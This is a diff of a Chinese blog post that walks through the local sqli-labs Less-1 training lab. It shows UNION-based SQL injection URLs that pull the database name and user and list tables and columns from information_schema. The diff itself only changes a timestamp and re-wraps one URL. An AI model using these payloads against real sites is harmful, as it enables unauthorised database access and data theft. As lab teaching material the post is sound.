@@ -75,7 +75,7 @@
     </p>
   <p class="article-time">
     <time datetime="2017-04-05T06:46:12.000Z" itemprop="datePublished">2017-04-05</time>
-    更新日期:<time datetime="2017-04-10T10:03:43.208Z" itemprop="dateModified">2017-04-10</time>
+    更新日期:<time datetime="2017-04-10T10:04:57.060Z" itemprop="dateModified">2017-04-10</time>
     
   </p>
 </header>
@@ -108,7 +108,7 @@
 <h5 id="获取当前数据库信息、用户信息"><a href="#获取当前数据库信息、用户信息" class="headerlink" title="获取当前数据库信息、用户信息"></a>获取当前数据库信息、用户信息</h5><p>单独使用database(),user()很麻烦，使用concat_ws()将其连接起来，concat_ws(char(58),database(),user())<br><img src="http://i.imgur.com/j4dmKSo.png" alt=""></p>
 <h5 id="查询security中的表"><a href="#查询security中的表" class="headerlink" title="查询security中的表"></a>查询security中的表</h5><p>MySQL中有一个默认的系统数据库information_schema。记录了所有数据库的信息，包括表、字段、权限等。其中SCHEMA，TABLES，COLUMNS表是重点</p>
 <p>直接上<a href="http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union</a> select 1,2,table_name from information_schema.tables where table_schema=”security” limit 0,5%23<br><img src="http://i.imgur.com/zeroTbg.png" alt=""><br>这里的数据库名可以用双引号括起来也可以写上ascii码的十六进制数。因为php源码的原因，这里只打印一行信息，所以加上LIMIT 语句，将所有表名打印出来SELECT * FROM users WHERE id=’4214214’ union select 1,2,table_name from information_schema.tables where table_schema=”security” limit 0,5%23 最后将目标放在users表上</p>
-<h5 id="查询users表中的字段名"><a href="#查询users表中的字段名" class="headerlink" title="查询users表中的字段名"></a>查询users表中的字段名</h5><p>方法同上，目标是columns表。直接上url使用limit将所有字段名打印出来。<a href="http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22%20limit%200,5%23" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22%20limit%200,5%23</a></p>
+<h5 id="查询users表中的字段名"><a href="#查询users表中的字段名" class="headerlink" title="查询users表中的字段名"></a>查询users表中的字段名</h5><p>方法同上，目标是columns表。直接上url使用limit将所有字段名打印出来。<a href="http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20</a><br>where%20table_schema=%22security%22%20and%20table_name=%22users%22%20limit%200,5%23</p>
 <p><img src="http://i.imgur.com/befdG9g.png" alt=""></p>
 <p><img src="http://i.imgur.com/IQT5rmF.png" alt=""></p>
 <p><img src="http://i.imgur.com/4fHorjv.png" alt=""></p>
